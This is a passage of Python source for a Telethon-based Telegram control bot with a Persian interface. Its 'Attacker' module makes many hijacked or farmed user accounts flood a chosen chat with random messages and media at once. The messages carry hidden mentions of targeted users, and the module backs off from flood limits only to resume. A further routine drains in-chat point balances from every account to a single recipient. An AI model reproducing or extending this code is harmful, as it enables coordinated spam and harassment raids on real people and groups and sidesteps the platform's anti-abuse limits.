              cur_ids = atk.get("mention_ids", [])
              if cur_ids != _og_mention_cache_ids:
                    _og_mention_cache_ids = list(cur_ids)
                    _og_mention_cache.clear()
                    _sym = groups_db.get(gname, {}).get("atk_char", "𒀽")
                    _res_cli = managed.get(online[0], {}).get("client") if online else None
                    for mid in cur_ids:
                        mid_s = str(mid).strip()
                        if mid_s.startswith("@"):
                            # resolve @username → numeric id
                            _uid = None
                            if _res_cli:
                                try:
                                    _ent = await _res_cli.get_entity(mid_s)
                                    _uid = getattr(_ent, 'id', None)
                                except Exception:
                                    pass
                            if _uid:
                                _og_mention_cache.append((_sym, _uid))
                        else:
                            try:
                                _og_mention_cache.append((_sym, int(mid_s)))
                            except ValueError:
                                pass

              def _build_mention_msg(base_text: str):
                  from telethon.tl.types import MessageEntityTextUrl
                  if not _og_mention_cache:
                      return base_text, None
                  parts = [base_text]
                  entities = []
                  offset = len(base_text.encode("utf-16-le")) // 2
                  for sym, uid in _og_mention_cache:
                      parts.append("\n" + sym)
                      sym_len = len(sym.encode("utf-16-le")) // 2
                      entities.append(MessageEntityTextUrl(
                          offset=offset + 1, length=sym_len,
                          url=f"tg://user?id={uid}",
                      ))
                      offset += 1 + sym_len
                  return "".join(parts), entities if entities else None

              txt_items  = [i for i in items if i["type"] == "text"]
              med_items  = [i for i in items if i["type"] not in ("text", "sticker")]
              combo_mode = atk.get("combo_mode", False)

              # ── parallel send: all accounts fire simultaneously ──
              if not groups_db.get(gname, {}).get("attacker", {}).get("active"):
                    continue

              _now = time.time()
              _ready = [s for s in list(online)
                          if _now >= _og_flood_cd.get(s, 0)
                          and _now >= _og_conn_cd.get(s, 0)
                          and managed.get(s)]
              if not _ready:
                    await asyncio.sleep(1)
                    continue

              async def _og_send_one(sess,
                                       _t=target,
                                       _ti=txt_items, _mi=med_items,
                                       _cm=combo_mode, _it=items):
                    meta = managed.get(sess)
                    if not meta:
                        return
                    _cli = meta.get("client")
                    if _cli is None or not _cli.is_connected():
                        _og_conn_cd[sess] = time.time() + 30
                        return
                    _combo_text = ""
                    if _cm and _ti and _mi:
                        _item = random.choice(_mi)
                        _combo_text = random.choice(_ti)["val"]
                    elif _ti and _mi:
                        _pool = _ti if random.random() < 0.5 else _mi
                        _item = random.choice(_pool)
                    else:
                        _item = random.choice(_it)
                    try:
                        async def _do_send():
                            _state = meta.get("state", {})
                            if _state.get("autotyping"):
                                try:
                                    await _cli(SetTypingRequest(peer=_t, action=SendMessageTypingAction()))
                                except Exception:
                                    pass
                                await asyncio.sleep(0.3)
                            elif _state.get("autorecord"):
                                try:
                                    await _cli(SetTypingRequest(peer=_t, action=SendMessageRecordAudioAction()))
                                except Exception:
                                    pass
                                await asyncio.sleep(0.3)

                            if _item["type"] == "text":
                                _txt, _ents = _build_mention_msg(_item["val"])
                                if _ents:
                                    await _cli.send_message(_t, _txt, formatting_entities=_ents)
                                else:
                                    await _cli.send_message(_t, _txt, parse_mode="md")
                            elif _item["type"] == "sticker":
                                fp = _item["val"]
                                if os.path.exists(fp):
                                    await _cli.send_file(_t, fp)
                                    if _og_mention_cache:
                                        _mtxt, _ments = _build_mention_msg("")
                                        _mtxt = _mtxt.strip()
                                        if _mtxt:
                                            if _ments:
                                                await _cli.send_message(_t, _mtxt, formatting_entities=_ments)
                                            else:
                                                await _cli.send_message(_t, _mtxt, parse_mode="md")
                            else:
                                fp = _item["val"]
                                if os.path.exists(fp):
                                    _base_cap = _combo_text if _combo_text else (_item.get("caption") or "")
                                    _cap, _cents = _build_mention_msg(_base_cap)
                                    await _cli.send_file(_t, fp,
                                                         caption=_cap if _cap.strip() else None,
                                                         formatting_entities=_cents if _cents else None,
                                                         parse_mode=None if _cents else "md")

                        _send_timeout = max(5.0, delay * 2)
                        await asyncio.wait_for(_do_send(), timeout=_send_timeout)
                        atk_stats[_key]["sent"] += 1
                    except asyncio.TimeoutError:
                        _og_conn_cd[sess] = time.time() + 30
                        atk_stats[_key]["errors"] += 1
                        log.debug(f"[ogatk:{gname}] timeout {sess} — conn cooldown 30s")
                    except FloodWaitError as _e:
                        _w = _e.seconds + random.randint(2, 8)
                        _og_flood_cd[sess] = time.time() + _w
                        atk_stats[_key]["errors"] += 1
                    except PeerFloodError:
                        _og_flood_cd[sess] = time.time() + 60 + random.randint(10, 30)
                        atk_stats[_key]["errors"] += 1
                    except (UserBannedInChannelError, ChatWriteForbiddenError):
                        atk_stats[_key]["errors"] += 1
                    except Exception as _e2:
                        log.debug(f"[ogatk:{gname}] send error {sess}: {_e2}")
                        atk_stats[_key]["errors"] += 1

              # تایمینگ دقیق: delay = فاصله کامل بین راندها (نه delay + زمان ارسال)
              _round_start = time.time()
              if atk.get("seq_mode", False) and _ready:
                  # Sequential: یه اکانت در هر seq_interval ثانیه، round-robin
                  _seq_sess = _ready[_og_rr_idx % len(_ready)]
                  _og_rr_idx += 1
                  _seq_iv = max(0.1, float(atk.get("seq_interval", 1)))
                  try:
                      await asyncio.wait_for(_og_send_one(_seq_sess), timeout=15)
                  except asyncio.CancelledError:
                      raise
                  except Exception:
                      pass
                  _elapsed = time.time() - _round_start
                  await asyncio.sleep(max(0.0, _seq_iv - _elapsed))
              else:
                  await asyncio.gather(*[_og_send_one(s) for s in _ready], return_exceptions=True)
                  _elapsed = time.time() - _round_start
                  await asyncio.sleep(max(0.1, delay - _elapsed))

          except asyncio.CancelledError:
              break
          except Exception as _loop_err:
              log.warning(f"[ogatk:{gname}] loop error (continuing): {_loop_err}")
              await asyncio.sleep(0.5)

    _og_atk_loop_ref['fn'] = _og_atk_loop  # store for watchdog

    def _og_live_stats_text(gname):
      atk  = groups_db.get(gname, {}).get("attacker", {})
      key  = f"og_{gname}"
      stats = atk_stats.get(key, {})
      sent  = stats.get("sent", 0)
      errors = stats.get("errors", 0)
      started_at = stats.get("started_at")
      active = atk.get("active", False)
      target = atk.get("target", "—")
      sessions = groups_db.get(gname, {}).get("sessions", [])
      online = [s for s in sessions if s in managed]
      if started_at and active:
          delta = datetime.utcnow() - started_at
          h, rem = divmod(int(delta.total_seconds()), 3600)
          m, s   = divmod(rem, 60)
          runtime = f"{h:02d}:{m:02d}:{s:02d}"
      else:
          runtime = "—"
      icon = pe('🟢') + " فعال" if active else pe('🔴') + " متوقف"
      last_upd = datetime.now(IRAN_TZ).strftime("%H:%M:%S")
      items_cnt = len(atk.get("items", []))
      txt_cnt   = sum(1 for i in atk.get("items", []) if i["type"] == "text")
      med_cnt   = items_cnt - txt_cnt
      return (
          f"{pe('⚔️')} پنل زنده Attacker\n"
          f"━━━━━━━━━━━━━━\n"
          f"{pe('👥')} ریموت: {gname}\n"
          f"{pe('📊')} وضعیت: {icon}\n"
          f"{pe('🎯')} مقصد: {target}\n"
          f"{pe('📝')} متن: {txt_cnt}  |  {pe('🖼')} مدیا: {med_cnt}\n"
          f"━━━━━━━━━━━━━━\n"
          f"{pe('📤')} ارسال‌شده: {sent:,}\n"
          f"{pe('❌')} خطا: {errors:,}\n"
          f"{pe('⏱')} آپتایم: {runtime}\n"
          f"{pe('👤')} اکانت فعال: {len(online)}\n"
          f"━━━━━━━━━━━━━━\n"
          f"{pe('🔄')} آپدیت: {last_upd}"
      )

    async def _og_atk_stats_updater(gname: str, chat_id: int, msg_id: int):
      """Edit the live stats message every 5 seconds while og attacker is active."""
      while True:
          try:
              atk = groups_db.get(gname, {}).get("attacker", {})
              if not atk.get("active"):
                    break
              try:
                    _p, _e = _apply_custom_emoji(_og_live_stats_text(gname))
                    await bot.edit_message(chat_id, msg_id, _p, formatting_entities=_e)
              except Exception:
                    pass
          except asyncio.CancelledError:
              break
          except Exception as e:
              log.warning(f"[og_atk_updater:{gname}] {e}")
          await asyncio.sleep(5)
      # final edit showing stopped
      try:
          _p, _e = _apply_custom_emoji(_og_live_stats_text(gname))
          await bot.edit_message(chat_id, msg_id, _p, formatting_entities=_e)
      except Exception:
          pass

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"ogatk_([^_]+)_(.+)")))
    async def ogatk_dispatch_cb(event):
      action = event.pattern_match.group(1).decode()
      raw2   = event.pattern_match.group(2).decode()
      # برای setgrp و sesstog فرمت: gname|value — فقط gname رو جدا کن
      gname  = raw2.split("|")[0] if action in ("setgrp", "sesstog", "selgrpg") else raw2
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)

      if action == "panel" or action == "":
          await sp_edit(event, _og_atk_text(gname), buttons=_og_atk_buttons(gname))
          await event.answer()
          return

      if action == "selsess":
          sessions = groups_db.get(gname, {}).get("sessions", [])
          atk = _og_atk_state(gname)
          sel = atk.get("sel_sessions", None)  # None یعنی همه
          if not sessions:
              return await event.answer("⚠️ هیچ سشنی توی این ریموت نیست", alert=True)
          rows = []
          for sess in sessions:
              is_sel = sel is None or sess in sel
              tick = "✅" if is_sel else "⬜️"
              label = sess[:28]
              rows.append([Button.inline(f"{tick} {label}", f"ogatk_sesstog_{gname}|{sess}".encode())])
          sel_count = len(sel) if sel is not None else len(sessions)
          rows.append([
              Button.inline("✅ همه", f"ogatk_sessall_{gname}".encode()),
              Button.inline("⬜️ هیچ‌کدام", f"ogatk_sessnone_{gname}".encode()),
          ])
          rows.append([Button.inline("🔙 برگشت به اتکر", f"ogatk_panel_{gname}".encode())])
          await sp_edit(event,
              f"👤 انتخاب اکانت‌های اتکر — ریموت {gname}\n"
              f"انتخاب‌شده: {sel_count} از {len(sessions)}\n"
              f"فقط اکانت‌های تیک‌دار در اتکر شرکت می‌کنن.",
              buttons=rows)
          await event.answer()
          return

      if action == "sesstog":
          parts = raw2.split("|", 1)
          gname_real = parts[0]
          sess_name  = parts[1] if len(parts) > 1 else ""
          atk = _og_atk_state(gname_real)
          sessions = groups_db.get(gname_real, {}).get("sessions", [])
          sel = atk.get("sel_sessions", None)
          if sel is None:
              sel = list(sessions)  # گسترش "همه" به لیست صریح
          if sess_name in sel:
              sel.remove(sess_name)
          else:
              sel.append(sess_name)
          atk["sel_sessions"] = sel
          save_groups()
          # رفرش پنل
          rows = []
          for sess in sessions:
              is_sel = sess in sel
              tick = "✅" if is_sel else "⬜️"
              rows.append([Button.inline(f"{tick} {sess[:28]}", f"ogatk_sesstog_{gname_real}|{sess}".encode())])
          rows.append([
              Button.inline("✅ همه", f"ogatk_sessall_{gname_real}".encode()),
              Button.inline("⬜️ هیچ‌کدام", f"ogatk_sessnone_{gname_real}".encode()),
          ])
          rows.append([Button.inline("🔙 برگشت به اتکر", f"ogatk_panel_{gname_real}".encode())])
          await sp_edit(event,
              f"👤 انتخاب اکانت‌های اتکر — ریموت {gname_real}\n"
              f"انتخاب‌شده: {len(sel)} از {len(sessions)}\n"
              f"فقط اکانت‌های تیک‌دار در اتکر شرکت می‌کنن.",
              buttons=rows)
          await event.answer()
          return

      if action == "sessall":
          atk = _og_atk_state(gname)
          atk["sel_sessions"] = None  # None = همه
          save_groups()
          sessions = groups_db.get(gname, {}).get("sessions", [])
          rows = []
          for sess in sessions:
              rows.append([Button.inline(f"✅ {sess[:28]}", f"ogatk_sesstog_{gname}|{sess}".encode())])
          rows.append([
              Button.inline("✅ همه", f"ogatk_sessall_{gname}".encode()),
              Button.inline("⬜️ هیچ‌کدام", f"ogatk_sessnone_{gname}".encode()),
          ])
          rows.append([Button.inline("🔙 برگشت به اتکر", f"ogatk_panel_{gname}".encode())])
          await sp_edit(event,
              f"👤 انتخاب اکانت‌های اتکر — ریموت {gname}\n"
              f"انتخاب‌شده: همه ({len(sessions)})\n"
              f"فقط اکانت‌های تیک‌دار در اتکر شرکت می‌کنن.",
              buttons=rows)
          await event.answer("✅ همه سشن‌ها انتخاب شدند")
          return

      if action == "sessnone":
          atk = _og_atk_state(gname)
          atk["sel_sessions"] = []
          save_groups()
          sessions = groups_db.get(gname, {}).get("sessions", [])
          rows = []
          for sess in sessions:
              rows.append([Button.inline(f"⬜️ {sess[:28]}", f"ogatk_sesstog_{gname}|{sess}".encode())])
          rows.append([
              Button.inline("✅ همه", f"ogatk_sessall_{gname}".encode()),
              Button.inline("⬜️ هیچ‌کدام", f"ogatk_sessnone_{gname}".encode()),
          ])
          rows.append([Button.inline("🔙 برگشت به اتکر", f"ogatk_panel_{gname}".encode())])
          await sp_edit(event,
              f"👤 انتخاب اکانت‌های اتکر — ریموت {gname}\n"
              f"انتخاب‌شده: ۰ از {len(sessions)}\n"
              f"فقط اکانت‌های تیک‌دار در اتکر شرکت می‌کنن.",
              buttons=rows)
          await event.answer("⬜️ هیچ سشنی انتخاب نشد")
          return

      if action == "start":
          atk = _og_atk_state(gname)
          if not atk.get("target"):
              return await event.answer(" اول مقصد رو تنظیم کن", alert=True)
          if not atk.get("items"):
              return await event.answer(" اول محتوا اضافه کن", alert=True)
          atk["active"] = True
          save_groups()
          old = atk_tasks.get(f"og_{gname}")
          if old and not old.done():
              old.cancel()
          atk_tasks[f"og_{gname}"] = asyncio.create_task(_og_atk_loop(gname))
          # ── live stats panel ──────────────────────────────────
          old_upd = atk_updater_tasks.pop(f"og_{gname}", None)
          if old_upd and not old_upd.done():
              old_upd.cancel()
          try:
              _p, _e = _apply_custom_emoji(_og_live_stats_text(gname))
              live_msg = await bot.send_message(event.chat_id, _p, formatting_entities=_e)
              atk_live_msgs[f"og_{gname}"] = {"chat_id": event.chat_id, "msg_id": live_msg.id}
              atk_updater_tasks[f"og_{gname}"] = asyncio.create_task(
                    _og_atk_stats_updater(gname, event.chat_id, live_msg.id)
              )
          except Exception as _le:
              log.warning(f"[og_atk_live:{gname}] could not send live panel: {_le}")
          # ─────────────────────────────────────────────────────
          await event.answer(" Attacker شروع شد!")
          await sp_edit(event, _og_atk_text(gname), buttons=_og_atk_buttons(gname))
          return

      if action == "stop":
          atk = _og_atk_state(gname)
          atk["active"] = False
          save_groups()
          t = atk_tasks.pop(f"og_{gname}", None)
          if t and not t.done():
              t.cancel()
          # ── stop live stats updater ───────────────────────────
          upd = atk_updater_tasks.pop(f"og_{gname}", None)
          if upd and not upd.done():
              upd.cancel()
          live = atk_live_msgs.pop(f"og_{gname}", None)
          if live:
              try:
                    _p, _e = _apply_custom_emoji(_og_live_stats_text(gname))
                    await bot.edit_message(live["chat_id"], live["msg_id"], _p, formatting_entities=_e)
              except Exception:
                    pass
          # ─────────────────────────────────────────────────────
          await event.answer(" Attacker متوقف شد")
          await sp_edit(event, _og_atk_text(gname), buttons=_og_atk_buttons(gname))
          return

      if action == "clr":
          atk = _og_atk_state(gname)
          atk["items"] = []
          save_groups()
          await event.answer(" محتوا پاک شد")
          await sp_edit(event, _og_atk_text(gname), buttons=_og_atk_buttons(gname))
          return

      if action == "settgt":
          pending_group_selection[event.sender_id] = {
              "og_step": "ogatk_target", "og_gname": gname}
          await sp_edit(event, " آیدی یا @username یا لینک مقصد حمله رو بنویس:",
                         buttons=[[Button.inline("❌ Cancel", f"ogatk_panel_{gname}".encode())]])
          await event.answer()
          return

      if action == "setsym":
          cur = groups_db.get(gname, {}).get("atk_char", "𒀽")
          pending_group_selection[event.sender_id] = {
              "og_step": "atk_char", "og_gname": gname}
          await sp_edit(event,
              f"𒀽 سیمبل فعلی: {cur}\n\n"
              f"یه کاراکتر/ایموجی بفرست که زیر پیام‌های اتکر به عنوان منشن نشون داده بشه.\n"
              f"(مثال: 𒀽 یا  یا  یا هر چیز دیگه‌ای)",
              buttons=[[Button.inline("❌ Cancel", f"ogatk_panel_{gname}".encode())]])
          await event.answer()
          return

      if action == "delay":
          pending_group_selection[event.sender_id] = {
              "og_step": "ogatk_delay", "og_gname": gname}
          await sp_edit(event, " تاخیر بین پیام‌ها رو به ثانیه بنویس (حداقل ۱):",
                         buttons=[[Button.inline("❌ Cancel", f"ogatk_panel_{gname}".encode())]])
          await event.answer()
          return

      if action == "combo":
          atk = _og_atk_state(gname)
          atk["combo_mode"] = not atk.get("combo_mode", False)
          save_groups()
          state = "✅ فعال" if atk["combo_mode"] else "❌ غیرفعال"
          await event.answer(f" حالت ترکیبی: {state}")
          await sp_edit(event, _og_atk_text(gname), buttons=_og_atk_buttons(gname))
          return

      if action == "seqmode":
          atk = _og_atk_state(gname)
          atk["seq_mode"] = not atk.get("seq_mode", False)
          save_groups()
          state = "✅ فعال" if atk["seq_mode"] else "❌ غیرفعال"
          await event.answer(f"🔁 Sequential: {state}")
          await sp_edit(event, _og_atk_text(gname), buttons=_og_atk_buttons(gname))
          return

      if action == "seqinterval":
          pending_group_selection[event.sender_id] = {
              "og_step": "ogatk_seqinterval", "og_gname": gname}
          cur_iv = groups_db.get(gname, {}).get("attacker", {}).get("seq_interval", 1)
          await sp_edit(event,
                         f"⏱ فاصله Sequential فعلی: {cur_iv} ثانیه\n\nعدد جدید رو بنویس (حداقل ۰.۱):",
                         buttons=[[Button.inline("❌ Cancel", f"ogatk_panel_{gname}".encode())]])
          await event.answer()
          return

      if action == "autostop":
          pending_group_selection[event.sender_id] = {
              "og_step": "ogatk_autostop", "og_gname": gname}
          cur_ash = groups_db.get(gname, {}).get("attacker", {}).get("auto_stop_hours", 0)
          cur_txt = f"{cur_ash} ساعت" if cur_ash else "غیرفعال"
          await sp_edit(event,
                         f"⏰ خاموش خودکار فعلی: {cur_txt}\n\n"
                         f"تعداد ساعت رو بنویس (مثلاً ۲ یا ۱.۵).\n"
                         f"برای غیرفعال کردن عدد ۰ بنویس:",
                         buttons=[[Button.inline("❌ Cancel", f"ogatk_panel_{gname}".encode())]])
          await event.answer()
          return

      if action == "addtext":
          pending_group_selection[event.sender_id] = {
              "og_step": "ogatk_text", "og_gname": gname}
          atk = _og_atk_state(gname)
          cnt = sum(1 for i in atk.get("items", []) if i["type"] == "text")
          await sp_edit(event, f" متن بنویس (فعلاً {cnt} متن).\nهر پیام یه آیتم، /done برای پایان:",
                         buttons=[[Button.inline("❌ Cancel", f"ogatk_panel_{gname}".encode())]])
          await event.answer()
          return

      if action in ("addphoto", "addgif", "addvideo", "addsticker"):
          mtype = action[3:]
          emoji_map = {"photo": "", "gif": "", "video": "", "sticker": ""}
          pending_group_selection[event.sender_id] = {
              "og_step": f"ogatk_media_{mtype}", "og_gname": gname}
          atk = _og_atk_state(gname)
          cnt = sum(1 for i in atk.get("items", []) if i["type"] == mtype)
          await sp_edit(event,
              f"{emoji_map.get(mtype,'')} {mtype} بفرست (فعلاً {cnt} فایل).\n/done برای پایان:",
              buttons=[[Button.inline("❌ Cancel", f"ogatk_panel_{gname}".encode())]])
          await event.answer()
          return

      if action == "tags":
          atk = _og_atk_state(gname)
          ids = atk.get("mention_ids", [])
          lines = "\n".join(f"• {x}" for x in ids) if ids else "— خالی —"
          txt = (
              f" منشن‌های Attacker — {gname}\n━━━━━━━━━━━━━━\n"
              f"این آیدی‌ها زیر هر پیام اضافه می‌شن:\n\n{lines}\n"
              f"━━━━━━━━━━━━━━\nفرمت: آیدی عددی یا @username"
          )
          await sp_edit(event, txt, buttons=[
              [Button.inline("➕ Add", f"ogatk_tagadd_{gname}".encode()),
                 Button.inline("🗑 Remove", f"ogatk_tagdel_{gname}".encode())],
              [Button.inline("📌 Clear All", f"ogatk_tagclr_{gname}".encode())],
              [Button.inline("⚔️ Attacker", f"ogatk_panel_{gname}".encode())],
          ])
          await event.answer()
          return

      if action == "tagadd":
          pending_group_selection[event.sender_id] = {
              "og_step": "ogatk_tagadd", "og_gname": gname}
          await sp_edit(event, " آیدی عددی یا @username بنویس:\n(/done برای پایان)",
                         buttons=[[Button.inline("❌ Cancel", f"ogatk_tags_{gname}".encode())]])
          await event.answer()
          return

      if action == "tagdel":
          pending_group_selection[event.sender_id] = {
              "og_step": "ogatk_tagdel", "og_gname": gname}
          await sp_edit(event, " آیدی یا @username که می‌خوای حذف کنی بنویس:",
                         buttons=[[Button.inline("❌ Cancel", f"ogatk_tags_{gname}".encode())]])
          await event.answer()
          return

      if action == "tagclr":
          atk = _og_atk_state(gname)
          atk["mention_ids"] = []
          save_groups()
          await event.answer(" منشن‌ها پاک شد")
          await sp_edit(event, _og_atk_text(gname), buttons=_og_atk_buttons(gname))
          return

      if action == "selgrp":
          sessions = groups_db.get(gname, {}).get("sessions", [])
          atk_sel  = _og_atk_state(gname)
          _sel     = atk_sel.get("sel_sessions", None)  # None = همه
          # فیلتر بر اساس سشن‌های انتخاب‌شده در اتکر
          if _sel is not None:
              sessions = [s for s in sessions if s in _sel]
          online = [s for s in sessions if s in managed]
          if not online:
              _msg = "⚠️ هیچ‌کدام از سشن‌های انتخاب‌شده آنلاین نیستن" if _sel else "⚠️ هیچ اکانتی آنلاین نیست"
              return await event.answer(_msg, alert=True)
          _sel_label = f"{len(online)} سشن انتخاب‌شده" if _sel is not None else f"{len(online)} اکانت"
          await event.answer("⏳ در حال دریافت گروه‌ها از سشن‌های انتخاب‌شده...")
          try:
              import time as _t
              _sel_sig   = ",".join(sorted(online))
              _cache_key = f"og_{gname}_{hash(_sel_sig)}"
              _cached = _atk_grp_cache.get(_cache_key)
              if _cached and (_t.time() - _cached["ts"]) < _ATK_GRP_CACHE_TTL:
                    groups_list = _cached["groups"]
              else:
                     groups_list = await _fetch_joined_groups(online)
                     _atk_grp_cache[_cache_key] = {"groups": groups_list, "ts": _t.time()}
              if not groups_list:
                    await sp_edit(event, "⚠️ گروهی پیدا نشد. اول با سشن‌های انتخاب‌شده جوین بشید.",
                                 buttons=[[Button.inline("⚔️ Attacker", f"ogatk_panel_{gname}".encode())]])
                    return
              _PAGE = 45
              _page = 0
              _total = len(groups_list)
              _slice = groups_list[_page * _PAGE: (_page + 1) * _PAGE]
              rows = []
              for name, gid in _slice:
                    label = (name or str(gid))[:30]
                    rows.append([Button.inline(f"🔘 {label}", f"ogatk_setgrp_{gname}|{gid}".encode())])
              nav = []
              if _total > _PAGE:
                    nav.append(Button.inline(f"➡️ بعدی (صفحه ۲ از {(_total-1)//_PAGE+1})",
                                             f"ogatk_selgrpg_{gname}|1".encode()))
              if nav:
                    rows.append(nav)
              rows.append([Button.inline("⚔️ Attacker", f"ogatk_panel_{gname}".encode())])
              await sp_edit(event,
                  f"👥 گروه‌های جوین‌شده — {_total} گروه از {_sel_label}\n"
                  f"صفحه ۱ از {(_total-1)//_PAGE+1} | یکی رو انتخاب کن:",
                  buttons=rows)
          except Exception as e:
              await sp_edit(event, f"❌ خطا: {e}",
                             buttons=[[Button.inline("⚔️ Attacker", f"ogatk_panel_{gname}".encode())]])
          return

      if action == "selgrpg":
          # raw2 = "gname|page"
          parts = raw2.split("|", 1)
          gname_pg = parts[0]
          try:
              _page = int(parts[1]) if len(parts) > 1 else 0
          except Exception:
              _page = 0
          # پیدا کردن cache key متناسب با انتخاب فعلی
          _atk_pg   = _og_atk_state(gname_pg)
          _sel_pg   = _atk_pg.get("sel_sessions", None)
          _sess_pg  = groups_db.get(gname_pg, {}).get("sessions", [])
          if _sel_pg is not None:
              _sess_pg = [s for s in _sess_pg if s in _sel_pg]
          _online_pg = [s for s in _sess_pg if s in managed]
          _sig_pg    = ",".join(sorted(_online_pg))
          _cache_key = f"og_{gname_pg}_{hash(_sig_pg)}"
          cached = _atk_grp_cache.get(_cache_key)
          if not cached:
              return await event.answer("⚠️ کش منقضی شده. دوباره From Joined Groups بزن.", alert=True)
          groups_list = cached["groups"]
          _PAGE = 45
          _total = len(groups_list)
          _max_page = (_total - 1) // _PAGE
          _page = max(0, min(_page, _max_page))
          _slice = groups_list[_page * _PAGE: (_page + 1) * _PAGE]
          rows = []
          for name, gid in _slice:
              label = (name or str(gid))[:30]
              rows.append([Button.inline(f"🔘 {label}", f"ogatk_setgrp_{gname_pg}|{gid}".encode())])
          nav = []
          if _page > 0:
              nav.append(Button.inline(f"⬅️ قبلی",
                                       f"ogatk_selgrpg_{gname_pg}|{_page-1}".encode()))
          if _page < _max_page:
              nav.append(Button.inline(f"➡️ بعدی",
                                       f"ogatk_selgrpg_{gname_pg}|{_page+1}".encode()))
          if nav:
              rows.append(nav)
          rows.append([Button.inline("⚔️ Attacker", f"ogatk_panel_{gname_pg}".encode())])
          await sp_edit(event,
              f"👥 گروه‌های جوین‌شده — {_total} گروه\n"
              f"صفحه {_page+1} از {_max_page+1} | یکی رو انتخاب کن:",
              buttons=rows)
          await event.answer()
          return

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"ogatk_setgrp_([^|]+)\|(.+)")))
    async def ogatk_setgrp_cb(event):
      gname  = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      gid_raw = event.pattern_match.group(2).decode()
      atk = _og_atk_state(gname)
      atk["target"] = gid_raw
      save_groups()
      await event.answer(f" مقصد تنظیم شد")
      await sp_edit(event, _og_atk_text(gname), buttons=_og_atk_buttons(gname))

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"ogatk_panel_(.+)")))
    async def ogatk_panel_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      await sp_edit(event, _og_atk_text(gname), buttons=_og_atk_buttons(gname))
      await event.answer()

    # ── MIO TRANSFER  (ogmiotx_ prefix) ─────────────────────
    # ═══════════════════════════════════════════════════════════
    def _og_miotx_state(gname):
      s = groups_db.setdefault(gname, {}).setdefault("mio_transfer", {
          "target": "", "recipient_id": ""
      })
      return s

    def _og_miotx_text(gname):
      s = _og_miotx_state(gname)
      all_sess = groups_db.get(gname, {}).get("sessions", [])
      return (
          f"🪙 انتقال میویی — ریموت {gname}\n━━━━━━━━━━━━━━\n"
          f"گروه مقصد: {s.get('target') or '—'}\n"
          f"آیدی گیرنده: {s.get('recipient_id') or '—'}\n"
          f"تعداد اکانت‌ها: {len(all_sess)}\n"
          f"━━━━━━━━━━━━━━\n"
          f"ترتیب: همه اکانت‌ها پشت سر هم، ۲ ثانیه فاصله"
      )

    def _og_miotx_buttons(gname):
      return [
          [Button.inline("▶️ اجرا", f"ogmiotx_run_{gname}".encode())],
          [Button.inline("🎯 گروه مقصد", f"ogmiotx_settgt_{gname}".encode())],
          [Button.inline("💰 آیدی گیرنده", f"ogmiotx_setrecip_{gname}".encode())],
          [Button.inline("🔙 Back", f"og_home_{gname}".encode())],
      ]

    async def _og_miotx_run(gname, report_chat):
      import re as _re
      import time as _mt
      s       = _og_miotx_state(gname)
      target  = (s.get("target") or "").strip()
      recip   = (s.get("recipient_id") or "").strip()
      if not target or not recip:
          await bot.send_message(report_chat,
              "⚠️ انتقال میویی: گروه مقصد یا آیدی گیرنده تنظیم نشده.",
              buttons=[[Button.inline("🪙 پنل", f"ogmiotx_panel_{gname}".encode())]])
          return
      # normalise target
      _raw = target
      for _pfx in ("https://t.me/", "http://t.me/", "t.me/"):
          if _raw.startswith(_pfx):
              _raw = _raw[len(_pfx):]
              break
      _raw = _raw.lstrip("@")
      try:
          tgt = int(_raw)
      except ValueError:
          tgt = _raw or None
      if not tgt:
          await bot.send_message(report_chat, "⚠️ گروه مقصد نامعتبر است.")
          return

      sessions = groups_db.get(gname, {}).get("sessions", [])
      online   = [s_ for s_ in sessions if s_ in managed]
      if not online:
          await bot.send_message(report_chat, "⚠️ هیچ اکانت آنلاینی در این ریموت وجود ندارد.")
          return

      await bot.send_message(report_chat,
          f"🪙 شروع انتقال میویی برای {len(online)} اکانت...")

      results = []
      for idx, sess in enumerate(online):
          meta = managed.get(sess)
          if not meta:
              results.append(f"❌ {sess}: آفلاین")
              continue
          cli = meta["client"]
          try:
              # ── Step 1: send میوهام ─────────────────────────
              sent1 = await cli.send_message(tgt, "میوهام")
              # wait for Meowie reply (up to 20s)
              _ev1, _box1 = asyncio.Event(), [None]
              async def _w1(ev, _sid=sent1.id, _cid=sent1.chat_id,
                            _ev=_ev1, _box=_box1):
                  if ev.chat_id == _cid and ev.reply_to and \
                     ev.reply_to.reply_to_msg_id == _sid:
                      _box[0] = ev
                      _ev.set()
              cli.add_event_handler(_w1, events.NewMessage())
              try:
                  await asyncio.wait_for(_ev1.wait(), timeout=20)
              except asyncio.TimeoutError:
                  pass
              finally:
                  try: cli.remove_event_handler(_w1)
                  except Exception: pass
              profile_msg = _box1[0]
              if not profile_msg:
                  results.append(f"⏱ {sess}: ربات پاسخ نداد (میوهام)")
                  await asyncio.sleep(2)
                  continue
              # ── Step 2: parse points ────────────────────────
              raw_txt = profile_msg.raw_text or ""
              _m = _re.search(r'(?:میو پوینت|mio point)[^\d]*([\d,،]+)', raw_txt, _re.IGNORECASE)
              if not _m:
                  results.append(f"❓ {sess}: نتوانست موجودی را پیدا کند")
                  await asyncio.sleep(2)
                  continue
              points = _m.group(1).replace(",", "").replace("،", "")
              try:
                  points = str(int(points))
              except ValueError:
                  results.append(f"❓ {sess}: عدد موجودی نامعتبر ({_m.group(1)})")
                  await asyncio.sleep(2)
                  continue
              # ── Step 3: send transfer command ───────────────
              tx_text = f"انتقال میویی {points} {recip}"
              sent2 = await cli.send_message(tgt, tx_text)
              # ── Step 4: wait for confirmation message ───────
              _ev2, _box2 = asyncio.Event(), [None]
              async def _w2(ev, _sid=sent2.id, _cid=sent2.chat_id,
                            _ev=_ev2, _box=_box2):
                  if ev.chat_id == _cid and ev.reply_to and \
                     ev.reply_to.reply_to_msg_id == _sid and ev.buttons:
                      _box[0] = ev
                      _ev.set()
              cli.add_event_handler(_w2, events.NewMessage())
              try:
                  await asyncio.wait_for(_ev2.wait(), timeout=20)
              except asyncio.TimeoutError:
                  pass
              finally:
                  try: cli.remove_event_handler(_w2)
                  except Exception: pass
              confirm_msg = _box2[0]
              if not confirm_msg:
                  results.append(f"⏱ {sess}: ربات پیام تایید نفرستاد")
                  await asyncio.sleep(2)
                  continue
              # ── Step 5: click tr_confirm_ button ────────────
              clicked = False
              try:
                  for _row in (confirm_msg.buttons or []):
                      for _btn in _row:
